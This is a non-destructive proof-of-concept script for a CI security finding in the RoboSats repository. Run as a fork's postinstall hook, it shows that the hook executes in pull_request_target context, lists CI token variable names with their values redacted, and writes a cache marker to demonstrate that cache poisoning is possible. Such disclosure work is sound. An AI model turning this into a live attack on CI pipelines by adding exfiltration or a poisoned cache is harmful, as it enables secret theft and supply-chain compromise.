// Non-destructive PoC for FINDING-GH-011 (RoboSats V1B+V6).
// Wired into frontend/package.json `scripts.postinstall`.
//
// Demonstrates ONLY:
//   - postinstall script from fork's package.json runs in PRT context
//   - identity (whoami)
//   - presence of GITHUB_TOKEN, ACTIONS_*, NPM_*, NODE_AUTH_TOKEN env keys
//     (key names + length only — values FULLY redacted)
//   - cache-write capability (drops a marker inside node_modules/.cache/)
//
// Does NOT:
//   - print any secret value
//   - perform external network egress
//   - exfiltrate anything
//   - persist beyond the runner

const fs = require("fs");
const path = require("path");
const { execSync } = require("child_process");

const banner = "::group::FINDING-GH-011 PoC — fork postinstall in PRT context";
const endgroup = "::endgroup::";

console.log(banner);

let whoami = "?";
try { whoami = execSync("whoami", { encoding: "utf8" }).trim(); } catch (e) {}
let hostname = "?";
try { hostname = execSync("hostname", { encoding: "utf8" }).trim(); } catch (e) {}

console.log(`[POC] whoami:           ${whoami}`);
console.log(`[POC] hostname:         ${hostname}`);
console.log(`[POC] cwd:              ${process.cwd()}`);
console.log(`[POC] script path:      ${__filename}`);
console.log(`[POC] runner os/arch:   ${process.env.RUNNER_OS}/${process.env.RUNNER_ARCH}`);
console.log(`[POC] github.workspace: ${process.env.GITHUB_WORKSPACE}`);

console.log("");
console.log("[POC] env keys of interest (values fully REDACTED):");
const interestPrefixes = ["GITHUB_", "ACTIONS_", "RUNNER_", "NPM_", "NODE_", "GH_", "CI"];
const keys = Object.keys(process.env).sort();
for (const k of keys) {
  if (interestPrefixes.some(p => k === p || k.startsWith(p))) {
    const v = process.env[k] || "";
    console.log(`  ${k.padEnd(40)} = <REDACTED length=${v.length}>`);
  }
}

console.log("");
console.log("[POC] PRESENCE of secrets-derived env vars (boolean):");
for (const v of [
  "GITHUB_TOKEN",
  "NODE_AUTH_TOKEN",
  "NPM_TOKEN",
  "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
  "ACTIONS_ID_TOKEN_REQUEST_URL",
]) {
  console.log(`  ${v.padEnd(40)} = ${process.env[v] ? "YES" : "no"}`);
}

// Cache-write capability: drop a marker that setup-node will save to cache.
try {
  const cacheDir = path.join(__dirname, "node_modules", ".cache", "_poc");
  fs.mkdirSync(cacheDir, { recursive: true });
  const marker = path.join(cacheDir, "FINDING-GH-011-marker.txt");
  fs.writeFileSync(
    marker,
    [
      "FINDING-GH-011 cache-write demonstration",
      `ts=${new Date().toISOString()}`,
      `cwd=${process.cwd()}`,
      `actor=${process.env.GITHUB_ACTOR || "?"}`,
      `head_ref=${process.env.GITHUB_HEAD_REF || "?"}`,
    ].join("\n") + "\n"
  );
  console.log(`[POC] cache marker written: ${marker}`);
} catch (e) {
  console.log(`[POC] cache marker write FAILED: ${e.message}`);
}

console.log(endgroup);
process.exit(0);
